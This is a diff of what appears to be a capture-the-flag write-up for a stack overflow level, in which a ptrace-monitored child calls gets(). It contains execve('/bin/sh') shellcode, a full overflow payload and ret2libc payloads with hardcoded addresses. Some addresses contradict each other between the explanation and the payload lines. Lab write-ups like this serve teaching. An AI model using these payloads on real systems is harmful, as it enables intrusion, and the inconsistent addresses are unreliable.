@@ -2,10 +2,10 @@
 => We have a fork and 2 processes
 => The child call the gets() function so we can overwrite the stack
 
-=> The parant have an infinite loop that check if the child returned terminated correctly or not 
+=> The parant have an infinite loop that check if the child returned terminated correctly or not
 -> prctl(PR_SET_PDEATHSIG (1), SIGHUP (1));
  1 SIGHUP     Terminate   Hang up controlling terminal or      Yes
-                          process 
+                          process
 
 Second protection:
 => The loop stop if the child used the sys call execve (11 in i386)
@@ -20,7 +20,7 @@ Useful GDB commands:
 - show follow-fork-mode - show the current follow  mode
 - set detach-on-fork off - view both processes
 - info inferior - the current process followed by gdb
-- inferior id - see the inferior processe number id (ex: inferior 1) 
+- inferior id - see the inferior processe number id (ex: inferior 1)
 - remove-inferiors id - remove the inferior "id"
 
 => Let's set the follow to the child and break after the gets()
@@ -34,8 +34,8 @@ r < <(python -c 'print "\x90"*(100) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\
 
 => It doesn't work as expected !
 
-fork: \xB8\x02\x00\x00\x00\xCD\x80 
-prctl: \x31\xC0\xB0\xAC\xBB\x01\x00\x00\x00\x31\xC9\xCD\x80 <- prctl(PR_SET_PDEATHSIG, 1) 
+fork: \xB8\x02\x00\x00\x00\xCD\x80
+prctl: \x31\xC0\xB0\xAC\xBB\x01\x00\x00\x00\x31\xC9\xCD\x80 <- prctl(PR_SET_PDEATHSIG, 1)
 shellcode: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
 
 
@@ -44,3 +44,43 @@ shellcode: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\
 -> Complete payload:
 
 (python -c 'print "\x90"*(100) + "\xB8\x02\x00\x00\x00\xCD\x80\x31\xC0\xB0\xAC\xBB\x01\x00\x00\x00\x31\xC9\xCD\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xcc"*(156-148) + "\xa0\xd5\xff\xff"'; cat)
+
+------------------------------------------------------------------
+
+In this level, we are dealing with a program where a child process is forked and monitored by a parent process using ptrace. The child process accepts user input via gets(), creating a classic buffer overflow vulnerability. However, the parent monitors the child and kills it if the exec() system call is attempted (detected by PTRACE_PEEKUSER).
+
+1. Vulnerability: gets() does not perform bounds checking, which allows us to overflow the stack and control the return address.
+
+2. Parent's Restrictions: The parent prevents exec() execution by monitoring the child process. However, we can bypass this by directly calling the system() function to execute /bin/sh without triggering exec(): ret2libc.
+
+3. GDB
+
+	for follow the child process
+	- set follow-fork-mode "child or parent"
+	- show follow-fork-mode
+	- set detach-on-fork off
+	- info inferior
+	- inferior id
+
+	inspect process and addresses
+	- info function system
+	- info function exit
+	- info proc map
+	- find start_address,end_adress,"/bin/sh"
+	- x/s address
+
+4. PAYLOAD
+
+	```python
+	[PADDING] + [system address] + [exit address] + ["/bin/sh" address]
+	```
+
+	```python
+	(python -c 'print("A"*156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe2\xf7" + "\xec\x97\xf8\xf7")'; cat) | ./level04
+	(python -c 'print("A"*156 + "\xd0\xae\xe6\xf7" + "\xec\x97\xf8\xf7" + "\x70\xeb\xe2\xf7")'; cat) | ./level04
+
+	```
+	- `"A"*156` : padding to reach the return address
+	- `\xd0\xae\xe6\xf7`: Address of system()
+	- `\x70\xeb\xe5\xf7`: Address of exit()
+	- `\xec\x97\xf8\xf7`: Address of /bin/sh
